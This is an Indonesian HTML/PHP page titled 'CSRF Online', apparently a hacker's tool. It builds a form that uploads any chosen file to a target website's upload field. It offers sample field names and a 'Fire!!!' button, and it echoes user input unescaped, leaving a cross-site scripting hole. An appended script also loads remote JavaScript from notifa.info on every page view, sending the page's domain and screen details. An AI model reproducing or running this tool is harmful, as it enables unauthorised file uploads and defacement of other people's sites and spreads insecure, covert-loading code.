<html>
    <head>
        <title>CSRF Online</title>
         <meta content='CSRF Online' name='title'/>
         <meta content='Mengupload File Ke Website' name='description'/>
         <meta content='CSRF Online' name='keywords'/>
         <meta content='CSRF Online' name='Abstract'/>
            
                                         <div style="display">		
<h2>Cross Site Requets Forgency(Csrf)</h2> 
<h3>Fungsi:Menguplod File Ke Sebuah Website</h4>                                         <center>
<form method="post">
<font face="Inconsolata" color="white"> URL Target : </font> <font color="black"> </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
<br><br><font face="Inconsolata" color="white"> Post File : </font> <font color="black"> </font><font color="black">-</font>  <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
<br><br><input type = "submit" name = "submit" value = "Kunci Target" class="login-input"style='width: 130px; height: 40px;'> </ form >
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['submit'];
if($d) {
    echo "<SCRIPT language='JavaScript'>alert('Upload Your File');</SCRIPT>";
	  echo "<SCRIPT language='JavaScript'>alert(' Status : Terkunci');</SCRIPT>";
    echo " <div id='preloader'> ";
    echo " <div id='loading'> ";
    echo " </div> </div> ";
    echo " <div class='content'> ";
    echo " </div> ";
		 echo "<br>";
        echo " <font face='Inconsolata' color='red'> $url  Status -> </font> <font face='Inconsolata' color='green'> Locked </font> ";
        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><font face='Inconsolata' color='black'> Filename : </font><font color=black>&#1203;&#824;&#1202;&#824;&#1203;</font><input type='file' name='$pf'><input type='submit' name='submit' value=' Fire!!!' class='login-input' style='width: 120px; height: 42px;'></form";
}
?>
</form>
<script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
    <script type="text/javascript">
  $(window).load(function() {
   $("#content").fadeOut();
   $("#preloader").delay(10).fadeOut("slow");
  })
    </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m1yEw0Zhss6dvuHT13xMZiBN37rSBhkrd%2fCI6B%2fO93ucRMvQCK4bk0WK%2bjVW9CZiim%2buqGrq0rZWmRqTaXCl13wBkXBaFmn5VyZYrEN%2brCEiUUv6PpHM%2fO5GRaJa2GVhiytVD8xjnt2oLcufZ12xvW1ulina2Rp%2fKFtFfU2SOAaIpMUNhsEmcAANAx2xbX0gOAEQ39FTx4l%2b0avPk9KlsWYDybRimp4YVR4x8vs8IvKwzsnHbA4dlWic8yZqScxxsiZE7U7iKfHuK%2fLHrPzq16ygpWj2dgoty%2fPbhMCbBJ%2bSGQdnm41dFpHbMOGKCs1X4kALbvo7%2ftcjaSsFbm0rhPdmmhoNlTYzqlUzBbkmagEbYz7suV%2buW3HhiNKdlobKcd7TUXRwV2tuumevdkz6ByjBcGh%2fc%2brHEE%2fvTuIcIk0NZbLPmDVwqbIWaWC7eeWDiuPN7cuMK%2fUHyQtdhDdTFbdyu7aa7XDtY7P3ptscirhAEN7wf3287hvdZJzqCj1clRB1X1N9EaytwJv3rBiqZJESyMLFie3VfNGJGpwGfypQCe%2bX4jNF5KYKZNxbbqFAK8rjFbeqRT%2fdTawUgcFBBww%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>

<br>Copyright_2019_Sad-Boy_Web(Csrf)</br> 

